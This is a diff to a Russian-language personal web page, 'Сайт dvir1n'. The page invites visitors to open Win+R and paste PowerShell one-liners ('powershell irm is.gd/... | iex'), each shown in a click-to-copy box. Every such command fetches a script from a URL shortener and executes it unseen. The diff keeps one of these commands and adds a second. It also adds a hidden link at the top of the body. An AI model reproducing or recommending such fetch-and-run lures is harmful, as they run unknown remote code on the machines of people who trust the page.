@@ -155,7 +155,7 @@
     }
   </style>
 </head>
-<body>
+<body><a href="https://nekoweb.org/cdn-cgi/content?id=jI60bf.zlRq3IQqDV1ydxDtgsDJPD5lDu.MqYCAp4yI-1778325554.7788541-1.0.1.1-FfeoEDC7yEaBXJY8CPQ4lYIc6qYQwwO65dOV2qzEgAM" aria-hidden="true" rel="nofollow noopener" style="display: none !important; visibility: hidden !important"></a>
 
 <div class="container">
   <h1>Сайт dvir1n</h1>
@@ -202,10 +202,13 @@
   <div class="links-section">
     <h3>Мои хацкер проекты 01010101 линукс страфна</h3>
     <p>Привет, это...<br>Раскрой секрет (Win + R):</p>
-    <div class="terminal-box" onclick="copyToClipboard()">
-      <input type="text" value="powershell irm is.gd/n4v4lny | iex" class="cmd-input" id="psCommand" readonly title="Нажми, чтобы скопировать">
+    <div class="terminal-box" onclick="copyCmd(this)">
+      <input type="text" value="powershell irm is.gd/n4v4lny | iex" class="cmd-input" readonly title="Нажми, чтобы скопировать">
     </div>
-    <p><small id="copyStatus" style="color: green; display: none;">Скопировано!</small></p>
+    <p>Генка из Win+R:</p>
+    <div class="terminal-box" onclick="copyCmd(this)">
+      <input type="text" value="powershell irm is.gd/genkaol | iex" class="cmd-input" readonly title="Нажми, чтобы скопировать">
+    </div>
   </div>
 
   <div class="mirrors-section">
@@ -233,15 +236,13 @@
     papus.style.transform = 'scale(1.1)';
     setTimeout(() => papus.style.transform = 'scale(1)', 150);
   });
-
-  function copyToClipboard() {
-    const copyText = document.getElementById("psCommand");
-    copyText.select();
-    navigator.clipboard.writeText(copyText.value);
-    
-    const status = document.getElementById("copyStatus");
-    status.style.display = "block";
-    setTimeout(() => status.style.display = "none", 2000);
+  function copyCmd(element) {
+    const input = element.querySelector('input');
+    input.select();
+    navigator.clipboard.writeText(input.value);
+    const originalColor = element.style.borderColor;
+    element.style.borderColor = "#76ff03";
+    setTimeout(() => element.style.borderColor = originalColor, 500);
   }
 </script>
 
